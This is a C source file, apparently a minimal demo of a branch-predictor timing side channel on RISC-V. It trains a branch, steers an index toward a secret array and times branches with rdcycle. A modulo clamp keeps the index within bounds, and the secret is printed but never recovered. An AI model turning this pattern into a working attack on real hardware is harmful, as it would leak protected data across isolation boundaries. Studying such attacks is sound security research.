#include <stdio.h>
#include <stdint.h>
#include <inttypes.h>
#include <stdlib.h>

#define SECRET_DATA_LEN 5
#define TRAIN_TIMES 6           
#define ATTACK_SAME_ROUNDS 10   
#define ATTACK_ROUNDS 1        
#define CAL_LOOP_TRAIN_REPEAT 30 

volatile uint8_t sec_data[SECRET_DATA_LEN] = {1,0,0,1,0};
volatile uint8_t array1[11] = {0,1,0,1,0,1,0,1,0,1, 1}; 

void branch(uint8_t *addr) {
    if (!(*addr)) {
        __asm__ __volatile__ ("nop\n" "nop\n");
    } else {
        __asm__ __volatile__ ("nop\n" "nop\n");
    }
}

static inline uint64_t time(void) {
    uint64_t v;
    asm volatile("fence iorw, iorw" ::: "memory");
    asm volatile("rdcycle %0" : "=r"(v));
    asm volatile("fence iorw, iorw" ::: "memory");
    return v;
}

int main(void) {
    printf("BRAD-v2 minimal demo (rdcycle timing)\n");
    printf("Secret (ground truth): ");
    for (int s = 0; s < SECRET_DATA_LEN; ++s) printf("%d ", (int)sec_data[s]);
    printf("\n\n");

    uint64_t attackIdx = (uint64_t)((uintptr_t)sec_data - (uintptr_t)array1);
    printf("attackIdx (distance in bytes) = %llu\n", (unsigned long long)attackIdx);

    for (int i = 0; i < SECRET_DATA_LEN; ++i) {
        for (int k = 0; k < ATTACK_SAME_ROUNDS; ++k) {
            for (int j = TRAIN_TIMES; j >= 0; --j) {
                uint64_t randIdx = (uint64_t)(k % 10);
                int64_t tmp = (int64_t)(j % (TRAIN_TIMES + 1)) - 1;
                uint64_t passInIdx = (uint64_t)( (uint64_t)tmp & ~0xFFFFULL );
                passInIdx = (passInIdx | (passInIdx >> 16));
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx));

                passInIdx = passInIdx % 11ULL;

                uint64_t start = time();
                branch((uint8_t*)&array1[passInIdx]);
                uint64_t end = time();
                uint64_t elapsed_cycles = end - start;

                if (j == 0) {
                    printf("i=%d k=%d j=%d passInIdx=%llu elapsed_cycles=%llu\n",
                           i, k, j, (unsigned long long)passInIdx, (unsigned long long)elapsed_cycles);
                }
            } 
        } 

        attackIdx++; 
    }

    printf("Done.\n");
    return 0;
}